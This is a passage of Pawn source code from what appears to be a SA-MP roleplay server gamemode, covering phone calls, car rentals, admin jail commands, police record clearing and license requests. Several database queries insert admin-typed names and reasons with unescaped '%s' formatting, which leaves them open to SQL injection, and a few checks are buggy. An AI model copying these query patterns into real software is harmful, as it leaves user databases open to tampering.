			if(IsPlayerConnected(i))
			{
				if(Mobile[i] == playerid)
				{
					Mobile[playerid] = i;
					SendClientMessage(i,COLOR_SERVER, "The other person has answered the call.");
                    SendClientMessage(playerid,COLOR_SERVER, "You have answered your phone.");
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
					if(PlayerInfo[playerid][pPhone] == 0)
					{
						SetPlayerAttachedObject(playerid,4,330,6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
					}
					else if(PlayerInfo[playerid][pPhone] == 1)
					{
						SetPlayerAttachedObject( playerid, 4, 18865, 6, 0.086043, 0.027719, 0.003817, 95.232246, 178.651031, 1.691840, 1.002077, 1.000000, 1.000000 ); // MobilePhone1 - phone1
					}
					return 1;
				}
			}
		}
	}
	return 1;
}
CMD:p(playerid, params[])
{
	return cmd_pickup(playerid, params);
}
CMD:hangup(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new caller = Mobile[playerid];
		if(IsPlayerConnected(caller))
		{
			if(caller != INVALID_PLAYER_ID)
			{
				if(caller != -1)
				{
					if(PhoneOnline[caller] == 0)
					{
						SendClientMessage(caller,COLOR_SERVER,"{B8FFDB}They hung up.");
					}
					CellTime[caller] = 0;
					CellTime[playerid] = 0;
					SendClientMessage(playerid,COLOR_SERVER,"{B8FFDB}You hung up.");
					Mobile[caller] = -1;
					SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);
					RemovePlayerAttachedObject(caller,4);
					RemovePlayerAttachedObject(playerid,4);
					Mobile[playerid] = -1;
					CellTime[playerid] = 0;
					PlayerInfo[playerid][pSpeaker] = 0;
					SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
					return 1;
				}
			}
		}
		SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Your phone is in your pocket.");
	}
	return 1;
}
CMD:h(playerid, params[])
{
	return cmd_hangup(playerid, params);
}
CMD:walkstyle(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
 	{
        {
        	ShowPlayerDialog(playerid, DIALOG_WALKSTYLE, DIALOG_STYLE_LIST, "Walking Style's", "Normal\nLow Walk\nGangsta\nGangsta2\nOld Walk\nOld Walk2\nNormal Walk2\nFemale Walk\nFemale Walk2\nWhore Walk\nFemale Walk3\nDrunk Walk\nBlind Walk\nNormal", "Select", "Close");
  			return 1;
		}
	}
	return 1;
}
CMD:locaterentcar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(HireCar[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have car/boat/scooter rent.");
		if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
		{
	 		new Float:x,Float:y,Float:z;
			SendClientMessage(playerid,COLOR_SERVER,"{5CAD5C}Car location is at red marker on a map.");
			GetVehiclePos(HireCar[playerid], x, y, z);
	  		SetPlayerCheckpoint(playerid, x, y, z, 4);
			CP[playerid] = 43;
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
		}
    }
    return 1;
}
CMD:unrentveh(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(HireCar[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have car/boat/scooter rent.");
		SetVehicleToRespawn(HireCar[playerid]);
		gCarLock[HireCar[playerid]] = 0;
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
    	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,0,bonnet,boot,objective);
		vehEngine[HireCar[playerid]] = 0;
	    GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	    SetVehicleParamsEx(HireCar[playerid],VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		HireCar[playerid] = -1;
		GameTextForPlayer(playerid, "~w~You no longer rent a car.", 5000, 3);
		TogglePlayerControllable(playerid, 1);
        SetPVarInt(playerid, "Engine", 0);
		return 1;
	}
	return 1;
}
CMD:unrentvehicle(playerid, params[])
{
    if(HireCar[playerid] != -1)
    {
        HireCar[playerid] = -1;
	}
	else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have a rental car/boat/bike/scooter.");
	return 1;
}
CMD:throwkey(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(HireCar[playerid] != -1) return SCM(playerid,COLOR_SERVER,"{FFB870}You dont have a key.");
		HireCar[playerid] = -1;
	}
	return 1;
}
CMD:unjailo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id[25],
			cont,
			str1[128];
		if(sscanf(params, "s[25]", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/unjailo <Name>");
		cont = MySQLCheckAccount(id);
		if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Jailed`='0',`JailTime`='0',`WantedLevel`='0' WHERE `name`='%s'",id);
		mysql_tquery(SQL,str1,"","");
	}
	return 1;
}
CMD:ajailo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id[25],reason[128],string[128],sendername[30],minutes,cont,playeridd,qstr[500],result[500];
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(sscanf(params, "s[25]is[128]", id,minutes,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ajailo <Name> <Minutes> <reason>");
		cont = MySQLCheckAccount(id);
		if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
		new timej = minutes*60;
		format(string, sizeof(string), "{FF6347}Offline: Jail: %s was jailed by %s for %d minutes, reason: %s.", id, sendername,minutes,reason);
		SendClientMessageToAll(COLOR_ERROR, string);
		format(qstr, sizeof(qstr), "SELECT `id` FROM users WHERE `name` = '%s'", id);
		mysql_store_result();
		mysql_query(SQL,qstr);
		if(mysql_retrieve_row())
		{
			mysql_fetch_field_row(result, "id"); playeridd = strval( result );
		}
		mysql_free_result();
		new var100[256];
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','%s','%s','%s')", playeridd,PlayerInfo[playerid][pSQLID],reason,id,sendername);
		mysql_tquery(SQL,var100,"","");
		format(string,sizeof(string),"You received jail from admin %s for %d minutes, reason: %s.",sendername,minutes,reason);
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s')",playeridd,string);
		mysql_tquery(SQL,var100,"","");
        format(string,sizeof(string),"Log: %s the set of %s set jail time %d minutes reason: %s.",sendername,id,minutes,reason);
        Adminlog(string);
		new str1[184];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Jailed`='2',`JailTime`='%d',`WantedLevel`='0' WHERE `name`='%s'",timej,id);
		mysql_tquery(SQL,str1,"","");
	}
	return 1;
}
CMD:ajail(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,reason[128],string[128],giveplayer[30],sendername[30],minutes;
		if(sscanf(params, "uis[128]", id,minutes,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/ajail <Name/Playerid> <Minutes> <reason>");
		{
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
			        if(PlayerInfo[id][pJailTime] > 0) return SCM(playerid,COLOR_SERVER,"{B8DBFF}Error: This player is already in jail.");
				    GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					ResetPlayerWeaponsEx(id);
					ResetPlayerWeapons(id);
					WantedPoints[id] = 0;
					PlayerInfo[id][pJailed] = 2;
					PlayerInfo[id][pJailTime] = minutes*60;
					JailPrice[id] = 0;
					SetPlayerInterior(id, 10);
                    new rand;
					rand = random(sizeof(gRandomAJailSpawns));
					SetPlayerPosEx(id,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
					format(string, sizeof(string), "{FF6347}Jail: %s was jailed by %s for %d minutes, reason: %s.", giveplayer, sendername,minutes,reason);
					SendClientMessageToAll(COLOR_ERROR, string);
					new var100[256];
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],reason,giveplayer,sendername);
					mysql_tquery(SQL,var100,"","");
			        format(string,sizeof(string),"Log: %s the set of %s set jail time %d minutes reason: %s",sendername,giveplayer,minutes,reason);
		            Adminlog(string);
		            Update(playerid,pJailedx);
					Update(playerid,pJailTimex);
					return 1;
				}
			}
			else
			{
				 SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
	}
	return 1;
}
CMD:dm(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,string[128],giveplayer[30],sendername[30],query[300],dm=0,dm2,time;
		if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/dm <Name/Playerid>");
		if(IsPlayerConnected(id))
		{
		    if(id != INVALID_PLAYER_ID)
		    {
				if(PlayerInfo[id][pJailTime] > 0) return SCM(playerid,COLOR_SERVER,"{B8DBFF}Error: This player is already in jail.");
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				ResetPlayerWeaponsEx(id);
				ResetPlayerWeapons(id);
				WantedPoints[id] = 0;
				JailPrice[id] = 0;
				PlayerInfo[id][pJailed] = 2;
				new doarodata = 0;
				Update(id, pJailedx);
				SetPlayerInterior(id, 10);
                new rand;
				rand = random(sizeof(gRandomAJailSpawns));
				SetPlayerPosEx(id,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
				format(query, sizeof(query),"SELECT * FROM `users` WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				new Cache: resultt = mysql_query(SQL, query);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
				    if(doarodata == 0)
				    {
						dm = cache_get_field_content_int(i, "dm");
						dm2 = dm + 1;
						if(dm < 6)
						{
							time = dm*10 + 10;
							PlayerInfo[id][pGunLicSuspend] = dm + 1;
						}
						else
						{
							time = 60;
							PlayerInfo[id][pGunLicSuspend] = 6;
						}
						PlayerInfo[id][pGunLic] = 0;
						PlayerInfo[id][pGunLicT] = 0;
						PlayerInfo[id][pJailTime] = time*60;
						format(string,sizeof(string),"{FF6347}Jail: %s was jailed by %s for %d minutes, reason: DM.",giveplayer,sendername,time);
						SendClientMessageToAll(COLOR_ERROR, string);
						new var100[256];
						mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','DM','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
				        format(string,sizeof(string),"Log: %s the set of %s set jail time %d minutes reason: DM.",sendername,giveplayer,time);
			            Adminlog(string);
						Update(id, pJailTimex);
						Update(id, pGunLicSuspendx);
						mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `dm`='%d' WHERE `name`='%s'", dm2, PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,var100,"","");
						doarodata = 1;
					}
				}
				cache_delete(resultt);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:dmp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,string[128],giveplayer[30],sendername[30],query[300],dm=0,dm2,time;
		if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/dmp <Name/Playerid>");
		if(IsPlayerConnected(id))
		{
		    if(id != INVALID_PLAYER_ID)
		    {
				if(PlayerInfo[id][pJailTime] > 0) return SCM(playerid,COLOR_SERVER,"{B8DBFF}Error: This player is already in jail.");
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new doarodata = 0;
				ResetPlayerWeaponsEx(id);
				ResetPlayerWeapons(id);
				WantedPoints[id] = 0;
				JailPrice[id] = 0;
				PlayerInfo[id][pJailed] = 2;
				Update(id, pJailedx);
				SetPlayerInterior(id, 10);
                new rand;
				rand = random(sizeof(gRandomAJailSpawns));
				SetPlayerPosEx(id,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
				format(query, sizeof(query),"SELECT * FROM `users` WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				new Cache: resultt = mysql_query(SQL, query);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
				    if(doarodata == 0)
				    {
						dm = cache_get_field_content_int(i, "dmp");
						dm2 = dm + 1;
						if(dm < 6)
						{
							time = dm*10 + 10;
						}
						else
						{
							time = 60;
						}
						PlayerInfo[id][pJailTime] = time*60;
						format(string,sizeof(string),"{FF6347}Jail: %s was jailed by %s for %d minutes, reason: DM #2.",giveplayer,sendername,time);
						SendClientMessageToAll(COLOR_ERROR, string);
						new var100[256];
						mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','DM #2','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
				        format(string,sizeof(string),"Log: %s the set of %s set jail time %d minutes reason: DM #2.",sendername,giveplayer,time);
			            Adminlog(string);
						Update(id, pJailTimex);
						mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `dmp`='%d' WHERE `name`='%s'", dm2, PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,var100,"","");
						doarodata = 1;
					}
				}
				cache_delete(resultt);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:unjail(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,string[128],giveplayer[30],sendername[30];
		if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/unjail <Name/Playerid>");
		if(IsPlayerConnected(id))
		{
		    if(id != INVALID_PLAYER_ID)
		    {
			    GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				ResetPlayerWeaponsEx(id);
				ResetPlayerWeapons(id);
				WantedPoints[id] = 0;
				PlayerInfo[id][pJailed] = 0;
				PlayerInfo[id][pJailTime] = 0;
				PlayerInfo[id][pWantedLevel] = 0;
				JailPrice[id] = 0;
				Update(id,pJailedx);
				Update(id,pJailTimex);
				Update(id,pWantedLevelx);
				SetPlayerInterior(id, 0);
				SetPlayerVirtualWorld(id, 0);
				new randomspawn = 1 + random(7);
		        if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(id, 364.0286,-2077.6917,7.8661);
			    }
				if(randomspawn == 2 || randomspawn == 7)
				{
				    SetPlayerPosEx(id, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
				    SetPlayerPosEx(id, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(id, 394.1896,-2078.0164,7.8661);
				}
				format(string,sizeof(string),"{ba9789}Admin %s unjailed player %s.",sendername,giveplayer);
				ABroadCast(COLOR_SERVER,string,3);
   				SetPlayerSkin(id, PlayerInfo[id][pModel]);
				ClearCrime(id);
				PlayerTextDrawHide(id, Jailtime[id]);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:clear(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	 	if(IsACop(playerid))
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			if(IsACopCar(tmpcar) || IsANgCar(tmpcar) || IsAFbiCar(tmpcar) || IsALVPDCar(tmpcar) || IsASFPDCar(tmpcar) || PlayerToPoint(10.0,playerid,1762.0028,-1584.4185,1742.5264) || PlayerToPoint(10.0,playerid,253.9323,69.7215,1003.6406) || PlayerToPoint(10.0,playerid,229.4171,167.4609,1003.0234)  || PlayerToPoint(10.0,playerid,187.8352,1931.4265,17.6874))
			{
				new id,string[128],giveplayer[30],sendername[30];
				if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/clear <Name/Playerid>");
				{
			    	if(IsPlayerConnected(id))
			    	{
			    		if(id != INVALID_PLAYER_ID)
			      		{
                        	if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "You cannot clear yourself.");
					    	GetPlayerName(id, giveplayer, sizeof(giveplayer));
					    	GetPlayerName(playerid, sendername, sizeof(sendername));
				    		format(string, sizeof(string), "* You cleared the Records and Wanted Points of %s.", giveplayer);
			     			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					    	format(string, sizeof(string), "* Officer %s has cleared your Records and Wanted Points.", sendername);
					    	SendClientMessage(id, COLOR_LIGHTBLUE, string);
						    format(string, sizeof(string), "* %s has cleared %s's Records and Wanted Points.", sendername, giveplayer);
                            SendTeamMessage(8, COLOR_LIGHTBLUE, string);
							SendTeamMessage(3, COLOR_LIGHTBLUE, string);
			     			SendTeamMessage(2, COLOR_LIGHTBLUE, string);
	          				SendTeamMessage(1, COLOR_LIGHTBLUE, string);
	          				SendTeamMessage(15, COLOR_LIGHTBLUE, string);
					    	WantedPoints[id] = 0;
		       				PlayerInfo[id][pWantedLevel] = 0;
						    SetPlayerWantedLevel(id, 0);
						    DestroyDynamic3DTextLabel(WantedScris[id]);
						    PlayerTextDrawHide(id, WantedText[id]);
					    	ClearCrime(id);
							Update(id,pWantedLevelx);
	                    }
					}
			    	else
				    {
				    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				    }
		        }
     		}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are to not inside the Police Station or in Police vehicle.");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not an Cop/FBI/National Guard.");
		}
	}
	return 1;
}
CMD:givelicense(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] >= 1)
        {
            new x_nr[30],id,sendername[30],giveplayer[30],string[128];
   			if(sscanf(params, "s[50]u",x_nr,id))
			{
			    SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/givelicense <License name> <Name/Playerid>");
			    SendClientMessage(playerid, COLOR_SERVER, "License: Sailing, Weapon, Flying.");
				return 1;
			}
			if(id == playerid) return SCM(playerid,COLOR_SERVER,"{FFB870}Please chose another player.");
			if(strcmp(x_nr,"flying",true) == 0)
			{
				if(IsPlayerConnected(id))
				{
				    if(id != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(id, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "* You've given a Flying License to %s.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given you a Flying License.",sendername);
				        SendClientMessage(id, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given %s a Flying License.",sendername,giveplayer);
				        SendFamilyMessage(12,COLOR_SERVER,string);
				        PlayerInfo[id][pFlyLic] = 1;
				        PlayerInfo[id][pFlyLicT] = 100;
				        PlayerInfo[playerid][pLGiven] += 1;
						Update(playerid,pLGivenx);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `FlyLic`='1',`FlyLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,str,"","");
				        return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"sailing",true) == 0)
			{
				if(IsPlayerConnected(id))
				{
				    if(id != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(id, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "* You've given a Sailing License to %s.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given you a Sailing License.",sendername);
				        SendClientMessage(id, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given %s a Sailing License.",sendername,giveplayer);
				        SendFamilyMessage(12,COLOR_SERVER,string);
				        PlayerInfo[id][pBoatLic] = 1;
				        PlayerInfo[id][pBoatLicT] = 100;
				        PlayerInfo[playerid][pLGiven] += 1;
						Update(playerid,pLGivenx);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `BoatLic`='1',`BoatLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,str,"","");
				        return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"weapon",true) == 0)
			{
				if(IsPlayerConnected(id))
				{
				    if(id != INVALID_PLAYER_ID)
				    {
						if(PlayerInfo[id][pLevel] < 3) return SCM(playerid,COLOR_SERVER,"{FFB870}This player does not have level 5.");
						if(PlayerInfo[id][pGunLicSuspend] > 0) return SCM(playerid,COLOR_SERVER,"This player have gun license suspended.");
						GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(id, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "* You've given a Weapon License to %s.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given you a Weapon License.",sendername);
				        SendClientMessage(id, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Instructor %s has given %s a Weapon License.",sendername,giveplayer);
				        SendFamilyMessage(12,COLOR_SERVER,string);
				        PlayerInfo[id][pGunLic] = 1;
				        PlayerInfo[id][pGunLicT] = 100;
				        PlayerInfo[playerid][pLGiven] += 1;
						Update(playerid,pLGivenx);
						new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `GunLic`='1',`GunLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
						mysql_tquery(SQL,str,"","");
				        return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				    return 1;
				}
			}
        }
        else
        {
            SendClientMessage(playerid, COLOR_SERVER, "You are not a instructor.");
            return 1;
        }
    }
    return 1;
}
CMD:needlicense(playerid, params[])
{
	return cmd_requestlicense(playerid, params);
}
CMD:needlicence(playerid, params[])
{
	return cmd_requestlicense(playerid, params);
}
CMD:requestlicense(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	   	new x_nr[50],sendername[30],string[128];
	   	GetPlayerName(playerid,sendername,sizeof(sendername));
	   	if(licensesend[playerid] == 1) return SCM(playerid,COLOR_SERVER,"{ba9789}You have already sent a request license.");
		if(licenseaccepted[playerid] == 1) return SCM(playerid,COLOR_SERVER,"{ba9789}You already have a request license.");
		if(PlayerInfo[playerid][pMember] == 12) return SCM(playerid,0xFFFFFFFF, "{FFB870}Error: You're instructor.");
		if(sscanf(params, "s[50]",x_nr))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/requestlicense <License Name>");
			SCM(playerid,COLOR_SERVER,"License name: {B8DBFF}Weapon, Flying, Sailing.");
			return 1;
		}
	    if(strcmp(x_nr,"weapon",true) == 0)
        {
            if(PlayerInfo[playerid][pGunLic] < 1)
            {
				format(string, sizeof(string), "{FFFF45}%s request weapon license.", sendername);
				SendFamilyMessage(12,COLOR_SERVER,string);
				format(string, sizeof(string), "{FFFF45}Use [/acceptlic %d] to accept license request.", playerid);
				SendFamilyMessage(12,COLOR_SERVER,string);
				licensesend[playerid] = 1;
				SendClientMessage(playerid, COLOR_SERVER,"{FFFF45}Your license request was sent to the instructors.");
				SetPVarString(playerid, "License", x_nr);
				arenevoiedelicenta[playerid] = 1;
				return 1;
        	}
    		else return SCM(playerid, COLOR_SERVER,"{FFB870}You have the gun license.");
        }
        if(strcmp(x_nr,"flying",true) == 0)
        {
            if(PlayerInfo[playerid][pFlyLic] < 1)
            {
				format(string, sizeof(string), "{FFFF45}%s request flying license.", sendername);
				SendFamilyMessage(12,COLOR_SERVER,string);
				format(string, sizeof(string), "{FFFF45}Use [/acceptlic %d] to accept this license request.", playerid);
				SendFamilyMessage(12,COLOR_SERVER,string);
				licensesend[playerid] = 1;
				SendClientMessage(playerid, COLOR_SERVER,"{FFFF45}Your license request was sent to the instructors.");
				SetPVarString(playerid, "License", x_nr);
				arenevoiedelicenta[playerid] = 2;
				return 1;
        	}
    		else return SCM(playerid, COLOR_SERVER,"{FFB870}You have the flying license.");
        }
        if(strcmp(x_nr,"Sailing",true) == 0)
        {
            if(PlayerInfo[playerid][pBoatLic] < 1)
            {
				format(string, sizeof(string), "{FFFF45}%s request sailing license.", sendername);
				SendFamilyMessage(12,COLOR_SERVER,string);
				format(string, sizeof(string), "{FFFF45}Use [/acceptlic %d] to accept this license request.", playerid);
				SendFamilyMessage(12,COLOR_SERVER,string);
				licensesend[playerid] = 1;
				SendClientMessage(playerid, COLOR_SERVER,"{FFFF45}Your license request was sent to the instructors.");
				SetPVarString(playerid, "License", x_nr);
				arenevoiedelicenta[playerid] = 3;
				return 1;
        	}
    		else return SCM(playerid, COLOR_SERVER,"{FFB870}You have the Sailing license.");
        }
	}
	return 1;
}
CMD:license(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new string[128],count= 0,titlestring[50],name[30];
		if(PlayerInfo[playerid][pMember] != 12) return SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: You're not instructor.");
		foreach(Player, i)
		{
	    	if(GetPVarString(i, "License", string, 128))
	    	{
	        	GetPVarString(i, "License", string, sizeof(string));
	        	count++;
	        	GetPlayerName(i, name,sizeof(name));
	        	format(string, sizeof(string), "%s(%d) - Request License ID: %d",name,i,i);
	        	format(titlestring, sizeof(titlestring), "Pending License: %d", count);
   				ShowPlayerDialog(playerid, 211, DIALOG_STYLE_LIST, titlestring, string, "Close", "");
   				SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}Use the command /clicense to check the pending license information.");
			}
		}
 	}
	return 1;
}
CMD:acceptlic(playerid, params[])
{
